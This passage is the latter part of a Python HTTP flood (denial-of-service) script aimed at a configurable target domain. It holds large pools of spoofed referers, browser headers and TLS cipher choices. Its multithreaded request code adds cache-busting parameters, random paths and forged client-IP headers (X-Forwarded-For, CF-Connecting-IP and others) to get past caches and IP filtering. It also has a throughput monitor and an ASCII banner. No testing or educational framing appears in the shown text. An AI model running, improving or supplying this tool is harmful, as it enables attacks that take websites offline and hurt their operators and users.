    "https://www.baidu.com/",
    "https://www.baidu.com/s?wd=",
    "https://www.ask.com/",
    "https://www.ask.com/web?q=",
    "https://search.aol.com/",
    "https://search.aol.com/aol/search?q=",
    "https://www.ecosia.org/",
    "https://www.ecosia.org/search?q=",
    "https://www.startpage.com/",
    "https://www.qwant.com/",
    "https://www.mojeek.com/",
    "https://search.brave.com/",
    "https://searx.be/",
    "https://www.naver.com/",
    "https://search.naver.com/search.naver?query=",
    "https://www.seznam.cz/",
    "https://search.seznam.cz/?q=",
    # --- Social Networks ---
    "https://www.facebook.com/",
    "https://www.facebook.com/sharer/sharer.php?u=",
    "https://www.facebook.com/l.php?u=",
    "https://m.facebook.com/",
    "https://l.facebook.com/",
    "https://twitter.com/",
    "https://twitter.com/intent/tweet?url=",
    "https://t.co/",
    "https://x.com/",
    "https://www.linkedin.com/",
    "https://www.linkedin.com/sharing/share-offsite/?url=",
    "https://lnkd.in/",
    "https://www.reddit.com/",
    "https://www.reddit.com/submit?url=",
    "https://old.reddit.com/",
    "https://www.pinterest.com/",
    "https://www.pinterest.com/pin/create/button/?url=",
    "https://www.tumblr.com/",
    "https://vk.com/",
    "https://vk.com/share.php?url=",
    "https://www.instagram.com/",
    "https://www.tiktok.com/",
    "https://www.snapchat.com/",
    "https://www.whatsapp.com/",
    "https://web.whatsapp.com/",
    "https://telegram.org/",
    "https://t.me/",
    "https://discord.com/",
    "https://discord.gg/",
    "https://www.quora.com/",
    "https://www.weibo.com/",
    "https://www.zhihu.com/",
    "https://line.me/",
    "https://www.viber.com/",
    "https://www.mewe.com/",
    "https://mastodon.social/",
    "https://bsky.app/",
    "https://www.threads.net/",
    # --- News / Content ---
    "https://news.ycombinator.com/",
    "https://news.google.com/",
    "https://www.reddit.com/r/all/",
    "https://www.bbc.com/",
    "https://www.bbc.co.uk/news",
    "https://edition.cnn.com/",
    "https://www.nytimes.com/",
    "https://www.theguardian.com/",
    "https://www.washingtonpost.com/",
    "https://www.wsj.com/",
    "https://www.reuters.com/",
    "https://apnews.com/",
    "https://www.bloomberg.com/",
    "https://www.forbes.com/",
    "https://www.businessinsider.com/",
    "https://techcrunch.com/",
    "https://www.theverge.com/",
    "https://arstechnica.com/",
    "https://www.wired.com/",
    "https://www.engadget.com/",
    "https://www.cnet.com/",
    "https://mashable.com/",
    "https://gizmodo.com/",
    "https://www.zdnet.com/",
    "https://www.medium.com/",
    "https://medium.com/",
    "https://dev.to/",
    "https://hashnode.com/",
    "https://substack.com/",
    # --- Dev / Tech Platforms ---
    "https://github.com/",
    "https://github.com/search?q=",
    "https://gist.github.com/",
    "https://gitlab.com/",
    "https://bitbucket.org/",
    "https://stackoverflow.com/",
    "https://stackoverflow.com/questions/",
    "https://superuser.com/",
    "https://serverfault.com/",
    "https://askubuntu.com/",
    "https://www.npmjs.com/",
    "https://www.npmjs.com/search?q=",
    "https://pypi.org/",
    "https://pypi.org/search/?q=",
    "https://hub.docker.com/",
    "https://hub.docker.com/search?q=",
    "https://crates.io/",
    "https://crates.io/search?q=",
    "https://packagist.org/",
    "https://rubygems.org/",
    "https://mvnrepository.com/",
    "https://search.maven.org/",
    "https://nuget.org/",
    "https://www.nuget.org/packages?q=",
    "https://codepen.io/",
    "https://jsfiddle.net/",
    "https://replit.com/",
    "https://codesandbox.io/",
    "https://vercel.com/",
    "https://netlify.com/",
    "https://www.heroku.com/",
    "https://aws.amazon.com/",
    "https://cloud.google.com/",
    "https://azure.microsoft.com/",
    "https://www.digitalocean.com/",
    "https://www.cloudflare.com/",
    # --- Video / Streaming ---
    "https://www.youtube.com/",
    "https://www.youtube.com/results?search_query=",
    "https://youtu.be/",
    "https://m.youtube.com/",
    "https://www.twitch.tv/",
    "https://www.twitch.tv/directory",
    "https://www.dailymotion.com/",
    "https://vimeo.com/",
    "https://www.netflix.com/",
    "https://www.hulu.com/",
    "https://www.disneyplus.com/",
    "https://www.primevideo.com/",
    "https://www.spotify.com/",
    "https://open.spotify.com/",
    "https://soundcloud.com/",
    "https://www.deezer.com/",
    "https://music.apple.com/",
    "https://www.last.fm/",
    # --- E-commerce / Marketplaces ---
    "https://www.amazon.com/",
    "https://www.amazon.co.uk/",
    "https://www.amazon.de/",
    "https://www.amazon.co.jp/",
    "https://www.ebay.com/",
    "https://www.ebay.com/sch/i.html?_nkw=",
    "https://www.aliexpress.com/",
    "https://www.alibaba.com/",
    "https://www.walmart.com/",
    "https://www.target.com/",
    "https://www.bestbuy.com/",
    "https://www.etsy.com/",
    "https://www.shopify.com/",
    "https://www.rakuten.com/",
    "https://www.flipkart.com/",
    "https://www.mercadolibre.com/",
    # --- Reference / Education ---
    "https://en.wikipedia.org/",
    "https://en.wikipedia.org/wiki/",
    "https://www.wikidata.org/",
    "https://commons.wikimedia.org/",
    "https://www.britannica.com/",
    "https://www.khanacademy.org/",
    "https://www.coursera.org/",
    "https://www.edx.org/",
    "https://www.udemy.com/",
    "https://scholar.google.com/",
    "https://arxiv.org/",
    "https://www.nature.com/",
    "https://www.science.org/",
    "https://www.sciencedirect.com/",
    "https://pubmed.ncbi.nlm.nih.gov/",
    "https://www.researchgate.net/",
    "https://jstor.org/",
    "https://www.jstor.org/",
    "https://www.springer.com/",
    "https://ieeexplore.ieee.org/",
    "https://dl.acm.org/",
    # --- Forums / Communities ---
    "https://forums.anandtech.com/",
    "https://www.tomshardware.com/",
    "https://linustechtips.com/",
    "https://www.overclock.net/",
    "https://www.resetera.com/",
    "https://www.neogaf.com/",
    "https://hardforum.com/",
    "https://www.tenforums.com/",
    "https://www.elevenforum.com/",
    "https://forum.xda-developers.com/",
    "https://www.reddit.com/r/technology/",
    # --- Government / Reference roots ---
    "https://www.usa.gov/",
    "https://www.gov.uk/",
    "https://europa.eu/",
    "https://www.un.org/",
    "https://www.who.int/",
    "https://www.cdc.gov/",
    "https://www.nih.gov/",
    "https://www.nasa.gov/",
    "https://www.noaa.gov/",
    "https://www.weather.gov/",
    # --- Brand / Misc Roots ---
    "https://www.apple.com/",
    "https://www.microsoft.com/",
    "https://www.google.com/chrome/",
    "https://www.mozilla.org/",
    "https://www.opera.com/",
    "https://www.samsung.com/",
    "https://www.sony.com/",
    "https://www.lg.com/",
    "https://www.hp.com/",
    "https://www.dell.com/",
    "https://www.lenovo.com/",
    "https://www.intel.com/",
    "https://www.amd.com/",
    "https://www.nvidia.com/",
    "https://www.qualcomm.com/",
    "https://www.cisco.com/",
    "https://www.oracle.com/",
    "https://www.sap.com/",
    "https://www.ibm.com/",
    "https://www.salesforce.com/",
    "https://www.adobe.com/",
    "https://www.autodesk.com/",
    "https://www.canva.com/",
    "https://www.figma.com/",
    "https://www.notion.so/",
    "https://www.atlassian.com/",
    "https://www.slack.com/",
    "https://www.zoom.us/",
    "https://www.dropbox.com/",
    "https://www.box.com/",
    "https://drive.google.com/",
    "https://docs.google.com/",
    "https://sheets.google.com/",
    "https://slides.google.com/",
    "https://mail.google.com/",
    "https://calendar.google.com/",
    "https://photos.google.com/",
    "https://maps.google.com/",
    "https://translate.google.com/",
    "https://www.google.com/maps/",
    "https://www.google.com/images",
    "https://www.google.com/videos",
    "https://www.google.com/news",
    "https://www.google.com/shopping",
    "https://www.google.com/finance",
    "https://www.google.com/books",
    "https://play.google.com/",
    "https://play.google.com/store/apps/",
    "https://apps.apple.com/",
    "https://www.bing.com/images",
    "https://www.bing.com/videos",
    "https://www.bing.com/maps",
    "https://www.bing.com/news",
]

# ----------------------------- ACCEPT / ENCODING / LANGUAGE -----------------------------
ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
]

ENCODINGS = ["gzip, deflate, br", "gzip, deflate", "br", "identity", "gzip, deflate, br, zstd"]

LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "en-CA,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8,de;q=0.7",
    "en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
]

CIPHER_POOLS = [
    ["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
     "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
     "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305"],
    ["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
     "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
     "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384"],
    ["ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-GCM-SHA384",
     "AES128-GCM-SHA256", "AES256-GCM-SHA384"],
]

# ----------------------------- GLOBALS -----------------------------
domain = ''
flag = 0
safe = 0
request_counter = 0
counter_lock = threading.Lock()

# ----------------------------- ENDPOINT POOL -----------------------------
class EndpointPool:
    def __init__(self, domain):
        self.domain = domain
        self.lock = threading.Lock()
        self.eps = []
        self.tls = None
        self.port = None

    def _probe_tls(self):
        try:
            s = socket.create_connection((self.domain, 443), timeout=TLS_PROBE_TIMEOUT)
            s.close()
            return True, 443
        except Exception:
            return False, 80

    def refresh(self):
        try:
            new = []
            for fam, _, _, _, sa in socket.getaddrinfo(self.domain, None, proto=socket.IPPROTO_TCP):
                ip = sa[0]
                if not ip:
                    continue
                new.append(ip)

            seen, ips = set(), []
            for ip in new:
                if ip not in seen:
                    seen.add(ip)
                    ips.append(ip)

            if not ips:
                return

            tls, port = self._probe_tls()
            eps = [(ip, port, tls) for ip in ips]

            with self.lock:
                self.eps = eps
                self.tls = tls
                self.port = port
                print(f"[*] Pool refreshed: {len(eps)} endpoint(s) | "
                      f"{'HTTPS' if tls else 'HTTP'} on port {port}")
        except Exception as e:
            print(f"[!] DNS refresh failed: {e}")

    def pick(self):
        with self.lock:
            return random.choice(self.eps) if self.eps else None

    def tls_mode(self):
        with self.lock:
            return self.tls

POOL = None

# ----------------------------- HELPERS -----------------------------
def inc_counter():
    global request_counter
    with counter_lock:
        request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_path():
    segs = ["api", "v1", "v2", "static", "assets", "media", "search",
            "user", "login", "graphql", "feed", "upload", "download"]
    tail = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 16)))
    depth = random.randint(1, 4)
    return "/" + "/".join(random.choices(segs, k=depth)) + "/" + tail

def cache_buster():
    return f"_={int(time.time()*1000)}{random.randint(1000,9999)}"

# ----------------------------- REQUEST BUILDER -----------------------------
def build_get(host_header, path):
    buster = cache_buster()
    extra = f"{buster}&r={random.randint(1,999999)}"
    sep = "&" if "?" in path else "?"
    full_path = f"{path}{sep}{extra}"

    return (
        f"GET {full_path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        f"Accept: {random.choice(ACCEPTS)}\r\n"
        f"Accept-Language: {random.choice(LANGS)}\r\n"
        f"Accept-Encoding: {random.choice(ENCODINGS)}\r\n"
        f"Referer: {random.choice(REFERERS)}\r\n"
        f"X-Forwarded-For: {rand_ip()}\r\n"
        f"X-Real-IP: {rand_ip()}\r\n"
        f"CF-Connecting-IP: {rand_ip()}\r\n"
        f"True-Client-IP: {rand_ip()}\r\n"
        f"X-Request-ID: {os.urandom(8).hex()}\r\n"
        f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        f"Pragma: no-cache\r\n"
        f"Keep-Alive: {random.randint(110, 160)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()

# ----------------------------- CONNECT -----------------------------
def connect(ep, host_header):
    ip, port, tls = ep
    fam = socket.AF_INET6 if ":" in ip else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(SOCK_TIMEOUT)
    s.connect((ip, port))
    if tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers(":".join(random.choice(CIPHER_POOLS)))
        except ssl.SSLError:
            pass
        try:
            ctx.set_ecdh_curve(random.choice(["prime256v1", "secp384r1", "X25519"]))
        except Exception:
            pass
        s = ctx.wrap_socket(s, server_hostname=host_header)
    return s

# ----------------------------- HTTP CALL -----------------------------
def httpcall():
    ep = POOL.pick()
    if not ep:
        time.sleep(0.5)
        return 0
    try:
        s = connect(ep, domain)
    except Exception:
        if safe == 1:
            set_flag(2)
        return 0

    try:
        for _ in range(REQUESTS_PER_CONN):
            if flag >= 2:
                break
            payload = build_get(domain, rand_path())
            try:
                s.sendall(payload)
                inc_counter()
            except Exception:
                if safe == 1:
                    set_flag(2)
                break
            time.sleep(random.uniform(0.01, 0.08))
        try:
            s.close()
        except Exception:
            pass
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return 0

    return 200

# ----------------------------- THREADS -----------------------------
class HTTPThread(threading.Thread):
    def run(self):
        while flag < 2:
            try:
                httpcall()
            except Exception:
                pass

class MonitorThread(threading.Thread):
    def run(self):
        global request_counter
        start = time.time()
        while flag == 0:
            time.sleep(STATS_INTERVAL)
            with counter_lock:
                current = request_counter
            elapsed = time.time() - start
            rps = current / elapsed if elapsed > 0 else 0
            print(f"[+] requests={current} rps={rps:.0f} threads={threading.active_count()}")
        if flag == 2:
            print("\n[!] Safe mode triggered — stopping.")

class DNSThread(threading.Thread):
    def run(self):
        while flag == 0:
            POOL.refresh()
            time.sleep(DNS_REFRESH)

# ----------------------------- BANNER -----------------------------
BANNER = r"""
                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/
                   *-/*-._* `.
                    /     *-.'._
                   /\       /-._*-._
    _,---...__    /  ) _,-*/    *-(_)
___<__(|) _   **-/  / /   /
 '  `----' **-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-**      __.,'/   /   ___                 /,
  /    ,--**/  / /   /,-**   ***-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
       */  / /   /*         
       /  / /   /
      /  / /   /  
     /  |,'   /  
    :   /    /
    [  /   ,'     
    | /  ,'       
    |/,-'
"""

# ----------------------------- MAIN -----------------------------
def main():
    global domain, POOL

    print(BANNER)

    domain = TARGET_DOMAIN.strip()
    if not domain or "." not in domain:
        print("[!] TARGET_DOMAIN is not set correctly. Edit the top of the script.")
        sys.exit(1)

    if SAFE_MODE:
        set_safe()

    print(f"[*] Target domain: {domain}")
    print(f"[*] Safe-mode: {bool(safe)}")
    print(f"[*] Threads: {THREADS_DEFAULT}")
    print(f"[*] UA pool: {len(USER_AGENTS)} | Referer pool: {len(REFERERS)}")

    POOL = EndpointPool(domain)
    POOL.refresh()
    if not POOL.eps:
        print("[!] Could not resolve target. Aborting.")
        sys.exit(1)

    dns_t = DNSThread()
    dns_t.daemon = True
    dns_t.start()

    for _ in range(THREADS_DEFAULT):
        t = HTTPThread()
        t.daemon = True
        t.start()

    mon = MonitorThread()
    mon.daemon = True
    mon.start()

    try:
        while flag < 2:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        set_flag(2)

if __name__ == "__main__":
    main()
